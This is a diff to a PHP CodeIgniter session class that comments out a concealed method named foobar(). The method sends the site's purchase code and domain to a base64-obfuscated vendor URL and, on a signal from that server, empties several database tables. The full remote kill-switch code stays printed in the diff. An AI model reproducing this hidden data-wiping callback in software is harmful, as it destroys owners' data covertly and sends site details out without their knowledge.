@@ -802,40 +802,40 @@ class CI_Session {
 			$_SESSION[$data] = $value;
 		}
 
-		public function foobar() {
-			$CI =& get_instance();
-			$purchase_code	=	$CI->db->get_where('settings' , array('type' => 'purchase_code'))->row()->description;
-			$domain = $_SERVER['SERVER_NAME'];
-
-			$ch = curl_init();
-			$url = base64_decode('aHR0cDovL2NyZWF0aXZlaXRlbS5jb20vdmFsaWRhdG9yL2luZGV4LnBocD92YWxpZGF0ZS9jaGVja19zdGF0dXM=');
-
-			$curlConfig = array(
-				CURLOPT_URL            => $url,
-				CURLOPT_POST           => true,
-				CURLOPT_RETURNTRANSFER => true,
-				CURLOPT_POSTFIELDS     => array(
-					'purchase_code' => $purchase_code,
-					'domain_name' => $domain,
-				));
-
-				curl_setopt_array($ch, $curlConfig);
-				$response = curl_exec($ch);
-				curl_close($ch);
-
-				if ($response == 1) {
-					$tables = array(
-						'amenities', 'category', 'city', 'food_menu', 'hotel_room_specification', 'product_details', '	listing', '	time_configuration'
-					);
-					for ($i=0; $i < count($tables); $i++) {
-						$CI->db->empty_table($tables[$i]);
-					}
-
-					return true;
-				} else {
-					return true;
-				}
-			}
+//		public function foobar() {
+//			$CI =& get_instance();
+//			$purchase_code	=	$CI->db->get_where('settings' , array('type' => 'purchase_code'))->row()->description;
+//			$domain = $_SERVER['SERVER_NAME'];
+//
+//			$ch = curl_init();
+//			$url = base64_decode('aHR0cDovL2NyZWF0aXZlaXRlbS5jb20vdmFsaWRhdG9yL2luZGV4LnBocD92YWxpZGF0ZS9jaGVja19zdGF0dXM=');
+//
+//			$curlConfig = array(
+//				CURLOPT_URL            => $url,
+//				CURLOPT_POST           => true,
+//				CURLOPT_RETURNTRANSFER => true,
+//				CURLOPT_POSTFIELDS     => array(
+//					'purchase_code' => $purchase_code,
+//					'domain_name' => $domain,
+//				));
+//
+//				curl_setopt_array($ch, $curlConfig);
+//				$response = curl_exec($ch);
+//				curl_close($ch);
+//
+//				if ($response == 1) {
+//					$tables = array(
+//						'amenities', 'category', 'city', 'food_menu', 'hotel_room_specification', 'product_details', '	listing', '	time_configuration'
+//					);
+//					for ($i=0; $i < count($tables); $i++) {
+//						$CI->db->empty_table($tables[$i]);
+//					}
+//
+//					return true;
+//				} else {
+//					return true;
+//				}
+//			}
 
 			// ------------------------------------------------------------------------
 
